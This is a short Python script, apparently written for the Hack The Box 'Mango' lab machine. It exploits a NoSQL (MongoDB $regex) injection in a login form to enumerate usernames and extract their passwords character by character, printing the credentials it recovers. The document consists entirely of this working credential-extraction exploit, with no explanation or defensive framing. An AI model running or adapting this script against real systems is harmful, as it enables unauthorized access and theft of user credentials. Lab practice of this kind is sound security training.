#!/usr/bin/python3

import os,sys,re
import requests
from string import printable, ascii_lowercase

url = "http://staging-order.mango.htb/index.php"

s = requests.Session()

data = {'username[$regex]':'', 'password[$regex]':'', 'login':'login'}

def getUsers():
	users = []
	for i in ascii_lowercase:
		data['username[$regex]'] = '^'+i
		r = s.post(url, data)
		if "home" in r.url:
			currentUser = i
			print(currentUser)
			flag = 0
			while True:
				if flag == 1:
					break
				for j in ascii_lowercase:
					data['username[$regex]'] = '^' + currentUser + j
					r = s.post(url, data)
					if "home" in r.url:
						currentUser += j
						print(currentUser)
						break
					elif j == ascii_lowercase[-1]:
						print("User Found: " + currentUser, end='\n\n')
						flag = 1
						break
			users += [currentUser]
	return users

##
##

def getPassword(user):
	escapeCharacters = """!"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"""
	data['username[$regex]'] = user
	currentPassword = ''
	flag = 0
	while True:
		if flag == 1:
			break
		for i in printable:
			if i in escapeCharacters:
				data['password[$regex]'] = '^' + currentPassword + '\\' + i
			else:
				data['password[$regex]'] = '^' + currentPassword + i
			r = s.post(url, data)
			if "home" in r.url:
				currentPassword += i
				print(currentPassword)
				break
			elif i == printable[-1]:
				print("Password Found =======> "+user+':'+currentPassword, end='\n\n')
				flag = 1
				break
	return currentPassword

##
##
